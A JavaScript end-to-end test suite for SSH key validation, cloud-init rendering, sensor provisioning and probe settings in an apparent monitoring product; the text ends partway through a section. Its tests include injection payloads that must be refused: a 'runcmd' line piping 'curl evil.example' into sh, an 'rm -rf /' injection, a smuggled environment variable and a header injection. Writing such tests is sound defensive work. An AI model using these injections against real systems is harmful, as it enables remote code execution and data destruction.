'use strict';
/* End-to-end check for BREAK-GLASS SSH ON AUTO-PROVISIONED SENSORS and the
 * PROBE SOURCE ADDRESS — `lib/sshaccess.js`, `providers/cloudinit.js`, the
 * provisioning path in `routes/synthetics.js`, the settings validation in
 * `routes/admin.js`, and the `last_ip` write in `routes/ingest.js`.
 *
 * ── Why this file exists ─────────────────────────────────────────────────────
 *
 * Two of the three things it covers fail SILENTLY and in the dangerous
 * direction:
 *
 *   • A key that reaches cloud-init unvalidated is not a broken feature, it is
 *     a REMOTE CODE EXECUTION on a machine we then open port 22 on. cloud-init
 *     is YAML built by string interpolation, so a "public key" carrying a
 *     newline continues the document — `runcmd:` and all. The refusal is
 *     asserted at both layers (the settings endpoint AND renderCloudInit), and
 *     the second one is not redundant: a script or a future ops path that
 *     writes org_settings directly would bypass the first.
 *
 *   • `sshAccessFor` returning null when it should not, or the security group
 *     not being passed to RunInstances, gives a node that boots with a key and
 *     no way in — or worse, the group's CIDRs silently not applying. Neither
 *     shows up in any response body: provisioning answers `{status:
 *     'provisioning'}` either way. So the assertions are on WHAT THE PROVIDER
 *     WAS CALLED WITH, which is the only place the truth exists.
 *
 * The third, `last_ip`, is the answer to "which addresses do I allow-list?" —
 * a question the product could not answer at all before, and which had to be
 * reconstructed from the cloud provider's API while writing this feature.
 *
 * ── What is stubbed, and what that costs ─────────────────────────────────────
 *
 * `providers.provider` is replaced on the module object (the pattern from
 * `e2e-vendors.js`); `providers.renderCloudInit` is NOT — the user-data asserted
 * on below is the real document a real node would boot with.
 *
 * NOT covered, stated plainly: the bodies of `aws.ensureSshAccess` and
 * `gcp.ensureSshAccess`, i.e. the actual EC2 `AuthorizeSecurityGroupIngress`
 * and the GCP firewall PATCH. Those need a cloud account; the same gap
 * `e2e-vendors.js` records for the SDK calls behind `provider()`. What is
 * covered is that they are called, with which ranges, and that a throw from
 * them rolls the provision back instead of leaving a VM nobody can find.
 *
 * ── Mutation results ────────────────────────────────────────────────────────
 *
 * Six of seven mutations turn this file red: never passing the security group
 * to RunInstances (-1), treating a half-configured pair as "off" (-7), dropping
 * the `last_ip` write (-2), removing the CIDR width guard so 0.0.0.0/0 is
 * accepted (-3), ensuring the inbound rule AFTER the instance boots (-3), and
 * removing the `.trim()` in `validateSshKey` (the file errors out).
 *
 * The survivor is recorded rather than hidden: deleting the explicit
 * `/[\r\n]/` guard changes NOTHING, because `KEY_RE` already rejects every
 * injection on its own. Measured, not reasoned about — a newline before
 * `runcmd:`, inside the comment, and a bare CR are all refused by the regex
 * alone; the only thing it accepts with a line break is a TRAILING one, and
 * `.trim()` has removed that before the regex runs (which is why the trim
 * mutation above is the one that bites). The guard is therefore defence in
 * depth against a future loosening of `KEY_RE` — worth keeping, and worth
 * knowing that the suite would not notice its removal.
 *
 * Hermetic: throwaway database, own port (3165), no network.
 *   cd server && node run-e2e.js sensors
 */
const fs = require('fs');
const os = require('os');
const path = require('path');

const { chk, report, onExit } = require('./e2e-lib').harness();

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'opscat-sensors-'));
process.env.OPSCAT_DATA_DIR = tmp;
onExit(() => fs.rmSync(tmp, { recursive: true, force: true }));
process.env.OPSCAT_SECRET = 'e2e-sensors-secret';
process.env.PORT = '3165';
process.env.OPSCAT_EDITION = 'cloud';
process.env.OPSCAT_ADMIN_EMAIL = 'seed-admin@e2e.test';
process.env.OPSCAT_ADMIN_PASSWORD = 'seed-admin-password-1';

require('./src/index.js'); // boots the app on :3165

const { addMembership } = require('./src/db');
const q = require('./src/db/shim');
const { hashPassword, now, newId, sha256, DEFAULT_ORG_ID } = require('./src/util');
const providers = require('./src/providers');
const { validateSshKey, parseCidrs, sshAccessFor } = require('./src/lib/sshaccess');

const BASE = 'http://127.0.0.1:3165';
const PASS = 'e2e-user-password-1';
const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

// A real ed25519 public key shape: the 32-byte body OpenSSH emits, base64.
const KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA1jK8mQ9wzR2t0uV5xY7bC3dE4fG6hJ8kL0mN2pQ4rS ops@opscat';
const KEY2 = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLongEnoughBodyForTheRegexToAccept1234567890 second@opscat';
// Real-SHAPED credentials. `renderCloudInit` validates both now — they are
// interpolated into an env file, where a newline writes a variable of its own —
// so a fixture like 'ocp_x' would be refused, which is the guard working.
const SKEY = 'ocs_' + 'a1'.repeat(24);
const SKEY_LEGACY = 'ocp_' + 'b2'.repeat(24);
const AKEY = 'oca_' + 'c3'.repeat(24);

// ── the cloud seam ───────────────────────────────────────────────────────────
// `seq` records the ORDER the provider was driven in. Without it "both were
// called once" passes just as happily when the instance boots first, which is
// the case that leaves a keyed box unreachable behind a group that does not
// exist yet.
const cloud = { ssh: [], created: [], seq: [], failSsh: null };
providers.provider = (key) => ({
  ensureSshAccess: async (secret, opts) => {
    cloud.ssh.push({ key, ...opts });
    cloud.seq.push('ssh');
    if (cloud.failSsh) throw new Error(cloud.failSsh);
    return key === 'aws' ? 'sg-0e2e' : 'opscat-sensor-ssh';
  },
  createInstance: async (secret, opts) => {
    cloud.created.push({ key, ...opts });
    cloud.seq.push('create');
    return { providerInstanceId: `i-${cloud.created.length}`, ip: null };
  },
  destroyInstance: async () => ({ ok: true }),
  listInstances: async () => [],
});

async function mkOrg(name, plan) {
  const id = newId();
  await q.prepare(`INSERT INTO organizations (id, name, slug, plan, status, created_at)
    VALUES (?, ?, ?, ?, 'active', ?)`).run(id, name, name.toLowerCase(), plan, now());
  return id;
}
async function mkUser(email, role, orgId) {
  const { salt, hash } = hashPassword(PASS);
  const uid = newId();
  await q.prepare(`INSERT INTO users (id, org_id, email, name, role, is_super_admin, pass_salt, pass_hash,
      color, active, must_change_password, created_at)
    VALUES (?, ?, ?, ?, ?, 0, ?, ?, '#388bfd', 1, 0, ?)`)
    .run(uid, orgId, email, email.split('@')[0], role, salt, hash, now());
  await addMembership(uid, orgId, role);
  return email;
}

async function login(email) {
  for (let i = 0; i < 40; i++) {
    let r;
    // eslint-disable-next-line no-await-in-loop
    try {
      r = await fetch(`${BASE}/api/auth/login`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password: PASS }),
      });
    } catch { await sleep(50); continue; }
    // eslint-disable-next-line no-await-in-loop
    if (r.status === 429) { await sleep(1000); continue; }
    // eslint-disable-next-line no-await-in-loop
    const j = await r.json().catch(() => null);
    return { cookie: (r.headers.get('set-cookie') || '').split(';')[0], csrf: j && j.csrf };
  }
  throw new Error(`login for ${email} stayed rate-limited`);
}

async function call(sess, method, p, body, extraHeaders) {
  let resets = 0;
  for (let i = 0; i < 40; i++) {
    const headers = Object.assign(sess ? { cookie: sess.cookie } : {}, extraHeaders || {});
    if (method !== 'GET') {
      if (sess) headers['X-OpsCat-CSRF'] = sess.csrf;
      headers['Content-Type'] = 'application/json';
    }
    let r;
    try {
      // eslint-disable-next-line no-await-in-loop
      r = await fetch(BASE + p, {
        method, headers, body: body !== undefined ? JSON.stringify(body) : undefined,
      });
    } catch (e) {
      if (++resets > 3) throw e;
      // eslint-disable-next-line no-await-in-loop
      await sleep(50);
      continue;
    }
    // eslint-disable-next-line no-await-in-loop
    const j = await r.json().catch(() => null);
    // eslint-disable-next-line no-await-in-loop
    if (r.status === 429) { await sleep(300); continue; }
    return { status: r.status, j };
  }
  throw new Error(`${method} ${p} stayed rate-limited`);
}

async function waitForServer() {
  for (let i = 0; i < 100; i++) {
    // eslint-disable-next-line no-await-in-loop
    try { if ((await fetch(`${BASE}/api/health`)).ok) return true; } catch { /* not yet */ }
    // eslint-disable-next-line no-await-in-loop
    await sleep(100);
  }
  return false;
}

async function main() {
  chk('server boots and answers /api/health', await waitForServer());

  const ACME = await mkOrg('Acme-sensors', 'enterprise');
  const admin = await login(await mkUser('admin@acme.sensors', 'admin', ACME));
  const lead = await login(await mkUser('lead@acme.sensors', 'lead', ACME));

  // ── 1. the validator, on its own ───────────────────────────────────────────
  // Unit-level on purpose: these are the refusals every layer below depends on,
  // and asserting them through HTTP alone would leave the second caller
  // (renderCloudInit) resting on the first caller's diligence.
  const refuses = (fn, arg) => { try { fn(arg); return false; } catch { return true; } };

  chk('a real ed25519 key is accepted and normalised', validateSshKey(`  ${KEY}  `) === KEY);
  chk('an rsa key is accepted', validateSshKey(KEY2) === KEY2);
  chk('a key with a newline is refused (cloud-init is YAML)',
    refuses(validateSshKey, `${KEY}\nruncmd:\n  - curl evil.example | sh`));
  // A TRAILING \r is trimmed like any other whitespace and is not a threat; an
  // EMBEDDED one is — some YAML parsers treat a bare CR as a line break, so it
  // is the same injection as \n with a different byte.
  chk('a carriage return inside the key is refused',
    refuses(validateSshKey, 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5\rruncmd: [x] key'));
  chk('trailing whitespace is trimmed rather than refused', validateSshKey(`${KEY}\r\n`) === KEY);
  chk('a PRIVATE key is refused', refuses(validateSshKey, '-----BEGIN OPENSSH PRIVATE KEY-----\nabc'));
  chk('nonsense is refused', refuses(validateSshKey, 'hunter2'));
  chk('an empty key is refused', refuses(validateSshKey, '   '));

  chk('a bare address becomes /32', parseCidrs('91.98.197.223')[0] === '91.98.197.223/32');
  chk('several ranges parse in order',
    parseCidrs('1.2.3.4/32, 10.4.0.0/16').join('|') === '1.2.3.4/32|10.4.0.0/16');
  chk('0.0.0.0/0 is refused — that is the absence of a restriction', refuses(parseCidrs, '0.0.0.0/0'));
  chk('a /8 is refused as too wide', refuses(parseCidrs, '10.0.0.0/8'));
  chk('an out-of-range octet is refused', refuses(parseCidrs, '10.0.0.999'));
  chk('a hostname is refused', refuses(parseCidrs, 'sensor.example.com'));
  chk('no range at all is refused', refuses(parseCidrs, ''));

  const getFake = (map) => (orgId, key, def) => (map[key] === undefined ? def : map[key]);
  chk('neither half configured means SSH is simply off',
    sshAccessFor(getFake({}), ACME) === null);
  chk('a key with no source range is refused, not silently ignored',
    refuses(() => sshAccessFor(getFake({ sensor_ssh_key: KEY }), ACME)));
  chk('source ranges with no key are refused',
    refuses(() => sshAccessFor(getFake({ sensor_ssh_cidrs: '1.2.3.4' }), ACME)));
  const pair = sshAccessFor(getFake({ sensor_ssh_key: KEY, sensor_ssh_cidrs: '1.2.3.4' }), ACME);
  chk('a configured pair comes back parsed', pair.sshKey === KEY && pair.cidrs[0] === '1.2.3.4/32');

  // ── 2. cloud-init, the document that actually boots ────────────────────────
  /* `render()`, not `providers.renderCloudInit()` directly, for the SETUP calls
   * whose result eight checks then read. renderCloudInit throws by design — that
   * is most of what section 2 asserts — and a throw at a bare top-level call
   * takes the whole run down before `report()`, so the harness prints "no
   * summary" and NOTHING it had already established. Measured: reverting the
   * ocs_ rename killed the run here instead of failing the three checks that are
   * about it. Same lesson as `!!tokLine &&` in section 12: a setup value that can
   * throw fails into a string, so the checks downstream of it fail and say why.
   * The calls that assert a REFUSAL still go through `refuses()` unchanged. */
  const render = (opts) => {
    try { return providers.renderCloudInit(opts); } catch (e) { return `RENDER THREW: ${e.message}`; }
  };
  const ciOff = render({ opscatUrl: 'https://opscat.io', probeKey: SKEY });
  const ciOn = render({ opscatUrl: 'https://opscat.io', probeKey: SKEY, sshKey: KEY });
  chk('without a key cloud-init creates no admin user', !ciOff.includes('opscat-admin'));
  chk('without a key cloud-init carries no authorized key', !ciOff.includes('ssh_authorized_keys'));
  chk('with a key the admin user exists', ciOn.includes('- name: opscat-admin'));
  chk('with a key it is authorized exactly once', ciOn.split(KEY).length - 1 === 1);
  chk('password auth is off either way',
    ciOff.includes('ssh_pwauth: false') && ciOn.includes('ssh_pwauth: false'));
  chk('the agent service user keeps its nologin shell',
    ciOn.includes('shell: /usr/sbin/nologin'));
  chk('renderCloudInit refuses an injected key itself, not only its caller',
    refuses(() => providers.renderCloudInit({
      opscatUrl: 'https://opscat.io', probeKey: SKEY, sshKey: `${KEY}\nruncmd: [rm -rf /]` })));

  // ── 2b. the credential namespace ───────────────────────────────────────────
  /* `lib/tokens.js` is the only place that knows a prefix. The claim worth
   * pinning is not "mint returns a string" — it is the two properties that made
   * `ocp_` → `ocs_` a safe rename, because both are invisible until they are
   * wrong:
   *
   *   1. Nothing AUTHENTICATES on a prefix. A key minted before the rename must
   *      still open the door, and the door is a sha256 lookup, so it does. If
   *      somebody ever adds a `startsWith('ocs_')` guard to `requireProbeKey`,
   *      every sensor node in the field that has not been re-provisioned stops
   *      reporting — with a 401 that looks exactly like a revoked key.
   *   2. No prefix is a prefix of another. `ocha_` under a scanner rule for
   *      `och_` is one match, not two credentials, and that is the reason the
   *      Sensor Agent's key is `ocs_` rather than `ocsa_`.
   */
  const toks = require('./src/lib/tokens');
  chk('a Sensor Agent key is minted as ocs_', toks.mint('sensorKey').startsWith('ocs_'));
  chk('a Host Agent token is minted as oca_', toks.mint('agentToken').startsWith('oca_'));
  chk('two mints never collide', toks.mint('sensorKey') !== toks.mint('sensorKey'));
  chk('an unknown credential kind throws rather than minting an unlabelled secret',
    refuses(() => toks.mint('sensorAgent')));
  const prefixes = Object.values(toks.PREFIX).concat(...Object.values(toks.LEGACY));
  chk('every prefix is distinct', new Set(prefixes).size === prefixes.length);
  /* The rule is `oc` + ONE letter + `_`, and this is the check that enforces it.
   * Written first as "no prefix starts with another" it went red on `ocm_at_`
   * and `ocm_rt_`, which extend `ocm_` — and those are RIGHT: they are three
   * credentials of one family (MCP OAuth), so a scanner rule for `ocm_` matching
   * all three is the correct answer, not a collision.
   *
   * The property that actually matters is the family ROOT. `oc[a-z]_` is one
   * letter by construction, so two roots can never shadow each other — which is
   * precisely what `ocha_` (root `och` + `a`, no underscore) fails, and why the
   * Sensor Agent's key is `ocs_` and not `ocsa_`. Extending your OWN root is
   * allowed; growing a second letter is not. */
  chk('every prefix is oc + ONE letter + _, so no family can shadow another',
    prefixes.every((p) => /^oc[a-z]_/.test(p)), prefixes.join(' '));
  chk('…and anything that extends another shares its family root',
    prefixes.every((a) => prefixes.every((b) =>
      a === b || !b.startsWith(a) || b.slice(0, 4) === a.slice(0, 4))),
    prefixes.join(' '));
  chk('the legacy sensor prefix is still accepted by the validator',
    toks.pattern('sensorKey').test(SKEY_LEGACY));
  chk('…but a Host Agent token is not a sensor key', !toks.pattern('sensorKey').test(AKEY));
  chk('cloud-init accepts a key minted before the rename',
    render({ opscatUrl: 'https://opscat.io', probeKey: SKEY_LEGACY })
      .includes(`OPSCAT_PROBE_KEY=${SKEY_LEGACY}`));
  // The env file is built by interpolation exactly like the YAML around it.
  chk('…and refuses a sensor key carrying a newline — that writes a second variable',
    refuses(() => providers.renderCloudInit({
      opscatUrl: 'https://opscat.io', probeKey: 'ocs_aaaa\nOPSCAT_URL=http://evil' })));

  // ── 3. the settings endpoint ───────────────────────────────────────────────
  const put = (sess, body) => call(sess, 'PATCH', '/api/admin/settings', body);

  chk('a lead may not set the sensor ssh key', (await put(lead, { sensor_ssh_key: KEY })).status === 403);
  chk('a key without ranges is refused with a reason',
    (await put(admin, { sensor_ssh_key: KEY })).status === 400);
  chk('ranges without a key are refused',
    (await put(admin, { sensor_ssh_cidrs: '1.2.3.4' })).status === 400);
  chk('0.0.0.0/0 is refused by the endpoint too',
    (await put(admin, { sensor_ssh_key: KEY, sensor_ssh_cidrs: '0.0.0.0/0' })).status === 400);
  chk('an injected key is refused by the endpoint',
    (await put(admin, { sensor_ssh_key: `${KEY}\nruncmd: x`, sensor_ssh_cidrs: '1.2.3.4' })).status === 400);
  const okSave = await put(admin, { sensor_ssh_key: KEY, sensor_ssh_cidrs: '91.98.197.223, 10.4.0.0/16' });
  chk('a valid pair saves', okSave.status === 200);
  const readBack = await call(admin, 'GET', '/api/admin/settings');
  chk('the key reads back', readBack.j.sensor_ssh_key === KEY);
  chk('the ranges read back', readBack.j.sensor_ssh_cidrs === '91.98.197.223, 10.4.0.0/16');
  chk('nothing was stored by the refused writes',
    readBack.j.sensor_ssh_key.indexOf('runcmd') === -1);

  // ── 4. provisioning with SSH configured ────────────────────────────────────
  const credRes = await call(lead, 'POST', '/api/synthetics/cloud-credentials',
    { provider: 'aws', label: 'e2e', secret: { accessKeyId: 'AKIAEXAMPLE', secretAccessKey: 'shh' } });
  chk('a cloud credential can be stored', credRes.status === 200);
  const credId = credRes.j.id;

  cloud.ssh.length = 0; cloud.created.length = 0; cloud.seq.length = 0;
  const prov = await call(lead, 'POST', '/api/synthetics/locations/provision',
    { provider: 'aws', region: 'eu-central-1', credentialId: credId });
  chk('provisioning succeeds', prov.status === 200);
  chk('the inbound rule was ensured exactly once', cloud.ssh.length === 1);
  chk('…in the region being provisioned', cloud.ssh[0] && cloud.ssh[0].region === 'eu-central-1');
  chk('…with the configured ranges, parsed',
    cloud.ssh[0] && cloud.ssh[0].cidrs.join('|') === '91.98.197.223/32|10.4.0.0/16');
  chk('the instance was launched into that security group',
    cloud.created[0] && cloud.created[0].securityGroupId === 'sg-0e2e');
  chk('the key reached the boot document', cloud.created[0].userData.includes(KEY));
  chk('the sensor key is still in there too', /OPSCAT_PROBE_KEY=ocs_/.test(cloud.created[0].userData));
  // Order matters and is not incidental: a node that boots with a key before
  // anything can reach it is the failure this feature exists to remove.
  chk('the rule is ensured BEFORE the instance is created',
    cloud.seq.join('>') === 'ssh>create', cloud.seq.join('>'));

  // ── 5. provisioning with SSH NOT configured ────────────────────────────────
  await put(admin, { sensor_ssh_key: '', sensor_ssh_cidrs: '' });
  cloud.ssh.length = 0; cloud.created.length = 0;
  const prov2 = await call(lead, 'POST', '/api/synthetics/locations/provision',
    { provider: 'aws', region: 'eu-west-1', credentialId: credId });
  chk('provisioning still works with SSH off', prov2.status === 200);
  chk('no inbound rule is created when SSH is off', cloud.ssh.length === 0);
  chk('and no security group is passed', !cloud.created[0].securityGroupId);
  chk('and the boot document carries no authorized key',
    !cloud.created[0].userData.includes('ssh_authorized_keys'));

  // ── 6. half-configured settings, written past the endpoint ─────────────────
  // The endpoint refuses this pair, so the only way to reach it is a direct
  // write — which is exactly what an EE provisioning path or a migration could
  // do. Provisioning must refuse rather than boot an unreachable box.
  await q.prepare(`INSERT INTO org_settings (org_id, key, value) VALUES (?, 'sensor_ssh_key', ?)
    ON CONFLICT (org_id, key) DO UPDATE SET value = excluded.value`).run(ACME, KEY);
  const { loadSettingsCache } = require('./src/db');
  await loadSettingsCache();
  cloud.ssh.length = 0; cloud.created.length = 0;
  const locsBefore = (await q.prepare('SELECT COUNT(*) c FROM synthetic_locations').get()).c;
  const nodesBefore = (await q.prepare('SELECT COUNT(*) c FROM sensor_nodes').get()).c;
  const half = await call(lead, 'POST', '/api/synthetics/locations/provision',
    { provider: 'aws', region: 'eu-west-2', credentialId: credId });
  chk('a half-configured pair refuses the provision', half.status === 502);
  chk('…and no instance was launched', cloud.created.length === 0);
  chk('…and the location row was rolled back',
    (await q.prepare('SELECT COUNT(*) c FROM synthetic_locations').get()).c === locsBefore);
  chk('…and so was the node row',
    (await q.prepare('SELECT COUNT(*) c FROM sensor_nodes').get()).c === nodesBefore);

  // ── 7. a failing rule must not leave a VM behind ───────────────────────────
  await q.prepare("UPDATE org_settings SET value = ? WHERE org_id = ? AND key = 'sensor_ssh_key'").run(KEY, ACME);
  await q.prepare(`INSERT INTO org_settings (org_id, key, value) VALUES (?, 'sensor_ssh_cidrs', '1.2.3.4')
    ON CONFLICT (org_id, key) DO UPDATE SET value = excluded.value`).run(ACME);
  await loadSettingsCache();
  cloud.failSsh = 'aws: no default VPC in eu-north-1';
  cloud.ssh.length = 0; cloud.created.length = 0;
  const fail = await call(lead, 'POST', '/api/synthetics/locations/provision',
    { provider: 'aws', region: 'eu-north-1', credentialId: credId });
  chk('a failing inbound rule fails the provision', fail.status === 502);
  chk('…the reason reaches the operator', /default VPC/.test(fail.j.error || ''));
  chk('…and no instance was launched', cloud.created.length === 0);
  chk('…and nothing was left in synthetic_locations',
    (await q.prepare('SELECT COUNT(*) c FROM synthetic_locations').get()).c === locsBefore);
  cloud.failSsh = null;

  // ── 8. the source address a probe checks in from ───────────────────────────
  const probeKey = 'ocs_' + 'e'.repeat(48);
  // sha256 comes from the module header
  const locId = Number(await q.prepare(`INSERT INTO synthetic_locations
      (org_id, city, cc, kind, probe_key_hash, active, created_at)
    VALUES (?, 'Testville', 'DE', 'customer', ?, 1, ?)`).insert(ACME, sha256(probeKey), now()));
  chk('a fresh location has no recorded address',
    (await q.prepare('SELECT last_ip FROM synthetic_locations WHERE id = ?').get(locId)).last_ip === null);

  const pull = await fetch(`${BASE}/v1/synthetics/checks`, { headers: { Authorization: `Bearer ${probeKey}` } });
  chk('the probe can pull its work list', pull.status === 200);
  const after = await q.prepare('SELECT last_ip, last_seen_at FROM synthetic_locations WHERE id = ?').get(locId);
  chk('the pull records where it came from', /^(::ffff:)?127\.0\.0\.1$|^::1$/.test(after.last_ip || ''));
  chk('…alongside the heartbeat it already kept', after.last_seen_at > 0);
  const listed = await call(lead, 'GET', '/api/synthetics/locations');
  const row = (listed.j || []).find((l) => l.id === locId);
  chk('and the UI is told about it', row && row.lastIp === after.last_ip);

  // A second pull from a different address must MOVE the answer: an ephemeral
  // public IP changing under a node is the normal case, not an edge case.
  // `trustProxy` defaults to true (Caddy sits in front in every deployment), so
  // the RIGHTMOST X-Forwarded-For entry is what `sec.clientIp` reads — which is
  // also why a client cannot use this header to write a fake address.
  await fetch(`${BASE}/v1/synthetics/checks`, {
    headers: { Authorization: `Bearer ${probeKey}`, 'X-Forwarded-For': '198.51.100.9, 203.0.113.7' },
  });
  const moved = await q.prepare('SELECT last_ip FROM synthetic_locations WHERE id = ?').get(locId);
  chk('a probe that moves updates its recorded address', moved.last_ip === '203.0.113.7');
  chk('…and a spoofed left-hand X-Forwarded-For entry is not what got stored',
    moved.last_ip !== '198.51.100.9');

  // ── 9. the fleet screen's answer to "which address do I allow-list?" ───────
  // Platform › Sensor fleet reads a DIFFERENT endpoint than the tenant UI, and it
  // is the one an operator opens when a customer asks. A field added to one and
  // forgotten in the other is exactly the drift this check exists to stop.
  const { salt: sSalt, hash: sHash } = hashPassword(PASS);
  const superId = newId();
  await q.prepare(`INSERT INTO users (id, org_id, email, name, role, is_super_admin, pass_salt, pass_hash,
      color, active, must_change_password, created_at)
    VALUES (?, ?, 'super@acme.sensors', 'super', 'admin', 1, ?, ?, '#388bfd', 1, 0, ?)`)
    .run(superId, ACME, sSalt, sHash, now());
  await addMembership(superId, ACME, 'admin');
  const su = await login('super@acme.sensors');

  const nodeId = Number(await q.prepare(`INSERT INTO sensor_nodes
      (provider, provider_instance_id, provider_region, instance_class, status, created_at)
    VALUES ('aws', 'i-0e2efixture', 'us-east-1', 'standard', 'online', ?)`).insert(now()));
  const mgId = Number(await q.prepare(`INSERT INTO synthetic_locations
      (org_id, city, cc, kind, region, provider, node_id, visible, active, last_ip, created_at)
    VALUES (NULL, 'Fixtureville', 'US', 'managed', 'North America', 'aws', ?, 1, 1, '203.0.113.42', ?)`)
    .insert(nodeId, now()));

  const fleet = await call(su, 'GET', `/api/superadmin/managed-locations/${mgId}`);
  chk('the fleet detail loads for a super-admin', fleet.status === 200);
  chk('…and carries the egress address', fleet.j && fleet.j.lastIp === '203.0.113.42');
  // Utilization: scheduled comes from the SAME rule the work list uses, so a check
  // pinned to another location must not count here — that is the failure mode where
  // an idle node looks busy and a busy one looks fine.
  chk('an unbooked node has nothing scheduled', fleet.j.utilization.scheduledPerMin === 0);
  chk('…and no observed runs', fleet.j.utilization.runsLastHour === 0);
  chk('…and reports no failure rate rather than 0%', fleet.j.utilization.failureRate === null);

  await q.prepare(`INSERT INTO org_location_access (org_id, location_id, created_at)
    VALUES (?, ?, ?)`).run(ACME, mgId, now());
  const c30 = Number(await q.prepare(`INSERT INTO synthetic_checks (org_id, type, target, interval_s,
      timeout_ms, enabled, created_at) VALUES (?, 'http', 'https://a.example', 30, 5000, 1, ?)`)
    .insert(ACME, now()));
  const cPinned = Number(await q.prepare(`INSERT INTO synthetic_checks (org_id, type, target, interval_s,
      timeout_ms, enabled, created_at) VALUES (?, 'http', 'https://b.example', 60, 5000, 1, ?)`)
    .insert(ACME, now()));
  await q.prepare('INSERT INTO check_locations (check_id, location_id) VALUES (?, ?)').run(cPinned, locId);
  const util = (await call(su, 'GET', `/api/superadmin/managed-locations/${mgId}`)).j.utilization;
  chk('an unpinned check counts against this node (30s = 2 runs/min)', util.scheduledPerMin === 2,
    String(util.scheduledPerMin));
  // The pinned one is assigned to a DIFFERENT location, so it must not count. Then
  // pin it here too and the number has to move — otherwise "2" was a coincidence.
  await q.prepare('INSERT INTO check_locations (check_id, location_id) VALUES (?, ?)').run(cPinned, mgId);
  const util1b = (await call(su, 'GET', `/api/superadmin/managed-locations/${mgId}`)).j.utilization;
  chk('…and a check pinned HERE is added (60s = 1 more run/min)', util1b.scheduledPerMin === 3,
    String(util1b.scheduledPerMin));

  await q.prepare(`INSERT INTO synthetic_results (check_id, location_id, ts, ok, latency_ms)
    VALUES (?, ?, ?, 1, 100), (?, ?, ?, 1, 300), (?, ?, ?, 0, NULL)`)
    .run(c30, mgId, now() - 60000, c30, mgId, now() - 40000, c30, mgId, now() - 20000);
  const util2 = (await call(su, 'GET', `/api/superadmin/managed-locations/${mgId}`)).j.utilization;
  chk('observed runs are counted over the last hour', util2.runsLastHour === 3);
  chk('…as a rate per minute', util2.observedPerMin === 0.05);
  chk('the failure share is a percentage of those runs', util2.failureRate === 33.3);
  chk('latency percentiles ignore the run that has none', util2.latencyP50 === 200);
  chk('…and p95 comes from the same window', util2.latencyP95 === 290);

  const noIp = await q.prepare('UPDATE synthetic_locations SET last_ip = NULL WHERE id = ?').run(mgId);
  chk('the update ran', noIp.changes === 1);
  const fresh = await call(su, 'GET', `/api/superadmin/managed-locations/${mgId}`);
  chk('a node that never checked in reports null, not the string "null"',
    fresh.j.lastIp === null);

  // ── 10. the User-Agent a check sends ──────────────────────────────────────
  // Resolved SERVER-side and handed to the probe, because a sensor has no access
  // to org settings — and a probe deciding its own identity is how two locations
  // end up sending different headers for the same check.
  const { DEFAULT_UA } = require('./src/lib/useragent');
  const uaCheck = (await call(lead, 'POST', '/api/synthetics/checks',
    { type: 'http', target: 'https://ua.example', locationIds: [locId] })).j.id;
  const pullUa = async () => {
    const r = await fetch(`${BASE}/v1/synthetics/checks`, { headers: { Authorization: `Bearer ${probeKey}` } });
    return (await r.json()).find((c) => c.id === uaCheck);
  };
  chk('with nothing configured the probe is told to send OUR user agent',
    (await pullUa()).userAgent === DEFAULT_UA, (await pullUa()).userAgent);

  await put(admin, { synthetic_user_agent: 'AcmeMonitor/2 (+https://acme.test/bot)' });
  chk('an org default replaces it', (await pullUa()).userAgent === 'AcmeMonitor/2 (+https://acme.test/bot)');

  const patched = await call(lead, 'PATCH', `/api/synthetics/checks/${uaCheck}`,
    { userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' });
  chk('a check may override the org default', patched.status === 200);
  chk('…and that is what the probe is handed',
    (await pullUa()).userAgent === 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
  chk('…while the check list reports both the override and what is effective',
    (await call(lead, 'GET', '/api/synthetics/checks')).j
      .find((c) => c.id === uaCheck).effectiveUserAgent.startsWith('Mozilla/5.0'));

  await call(lead, 'PATCH', `/api/synthetics/checks/${uaCheck}`, { userAgent: '' });
  chk('clearing it falls back to the org default again',
    (await pullUa()).userAgent === 'AcmeMonitor/2 (+https://acme.test/bot)');

  // A header, so a newline is header injection — one layer up from the cloud-init
  // case above, same class of mistake.
  chk('a user agent with a newline is refused on the check',
    (await call(lead, 'PATCH', `/api/synthetics/checks/${uaCheck}`,
      { userAgent: 'X/1\r\nX-Injected: 1' })).status === 400);
  chk('…and on the org default', (await put(admin, { synthetic_user_agent: 'X/1\nBad: 1' })).status === 400);
  chk('an over-long user agent is refused',
    (await call(lead, 'PATCH', `/api/synthetics/checks/${uaCheck}`, { userAgent: 'x'.repeat(201) })).status === 400);
  chk('…and none of the refusals changed what is sent',
    (await pullUa()).userAgent === 'AcmeMonitor/2 (+https://acme.test/bot)');

  // ── 11. the version conversation a probe-only sensor can have ─────────────
  // A sensor has a probe key and no agent token, so it never reaches the
  // heartbeat — which is why sensor_nodes.agent_version was read in four places
  // and written in none. Both directions ride on HEADERS: the response body is a
  // bare array that deployed agents parse as one, so it cannot grow a wrapper.
  const nodeRow = () => q.prepare('SELECT agent_version FROM sensor_nodes WHERE id = ?').get(nodeId);
  const mgKey = 'ocs_' + 'f'.repeat(48);
  await q.prepare('UPDATE synthetic_locations SET probe_key_hash = ? WHERE id = ?')
    .run(sha256(mgKey), mgId);
  chk('a node reports no version before it has checked in', (await nodeRow()).agent_version === null);

  const pullWithVersion = (v) => fetch(`${BASE}/v1/synthetics/checks`,
    { headers: Object.assign({ Authorization: `Bearer ${mgKey}` }, v ? { 'X-OpsCat-Agent-Version': v } : {}) });
  const withVer = await pullWithVersion('0.3.9');
  chk('the pull still answers 200 with a version header attached', withVer.status === 200);
  chk('…and the node now reports what it is running', (await nodeRow()).agent_version === '0.3.9');
  chk('…while the response says what the server has bundled',
    /^\d+\.\d+\.\d+$/.test(withVer.headers.get('x-opscat-agent-latest') || ''),
    String(withVer.headers.get('x-opscat-agent-latest')));
  const bundled = withVer.headers.get('x-opscat-agent-latest');
  chk('…which is the version of the agent this build ships',
    bundled === (/const VERSION = '([^']+)'/.exec(
      fs.readFileSync(path.join(__dirname, '..', 'agent', 'opscat-agent.js'), 'utf8')) || [])[1]);

  await pullWithVersion('0.4.0-rc1');
  chk('a later pull moves the recorded version', (await nodeRow()).agent_version === '0.4.0-rc1');
